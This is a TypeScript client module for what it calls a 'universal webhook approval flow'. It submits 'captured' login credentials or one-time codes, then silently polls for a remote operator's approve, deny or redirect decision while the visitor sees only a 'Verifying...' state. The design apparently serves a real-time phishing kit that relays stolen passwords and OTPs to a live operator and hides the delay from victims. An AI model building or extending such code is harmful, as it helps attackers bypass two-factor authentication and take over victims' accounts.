"use client"

import { POLL_MS } from "@/lib/approval-messages"

/**
 * Client side of the universal webhook approval flow.
 *
 * The caller submits the captured input first (login credentials or OTP),
 * then creates an approval request and polls for the operator's decision in
 * the background. No countdown or waiting time is displayed on the page —
 * the visitor only sees the regular "Verifying..." state.
 *
 * If no response arrives within the waiting window the result is "expired"
 * and the caller keeps the visitor on the current page.
 */

export type ApprovalStage = "login" | "otp"
export type ApprovalOutcome = "approve" | "deny" | "redirect" | "expired" | "unavailable"

interface CreateResponse {
  ok?: boolean
  id?: string
  status?: string
  remainingMs?: number
}

export async function createApproval(stage: ApprovalStage, userId: string): Promise<string | null> {
  try {
    const response = await fetch("/api/webhook", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ stage, userId }),
    })
    const data = (await response.json().catch(() => null)) as CreateResponse | null
    if (!response.ok || !data?.ok || typeof data.id !== "string" || !data.id) {
      return null
    }
    return data.id
  } catch {
    return null
  }
}

export async function pollApproval(id: string): Promise<{ status: ApprovalOutcome; remainingMs: number }> {
  try {
    const response = await fetch(`/api/webhook/status?id=${encodeURIComponent(id)}`, {
      cache: "no-store",
    })
    const data = (await response.json().catch(() => null)) as CreateResponse | null
    if (!response.ok || !data?.ok || typeof data.status !== "string") {
      return { status: "unavailable", remainingMs: 0 }
    }
    const status = data.status
    if (status === "approve" || status === "deny" || status === "redirect" || status === "expired") {
      return { status, remainingMs: typeof data.remainingMs === "number" ? data.remainingMs : 0 }
    }
    return { status: "unavailable", remainingMs: typeof data.remainingMs === "number" ? data.remainingMs : 0 }
  } catch {
    return { status: "unavailable", remainingMs: 0 }
  }
}

/**
 * Waits for a decision on the approval request, polling silently until the
 * operator responds or the waiting window elapses.
 */
export async function waitForApproval(id: string, timeoutMs: number): Promise<ApprovalOutcome> {
  const deadline = Date.now() + timeoutMs

  while (Date.now() < deadline) {
    const { status, remainingMs } = await pollApproval(id)

    if (status === "approve" || status === "deny" || status === "redirect") {
      return status
    }
    if (status === "expired") {
      return "expired"
    }

    const waitMs = Math.min(POLL_MS, Math.max(0, deadline - Date.now()), remainingMs || POLL_MS)
    if (waitMs <= 0) break
    await new Promise((resolve) => setTimeout(resolve, waitMs))
  }

  return "expired"
}
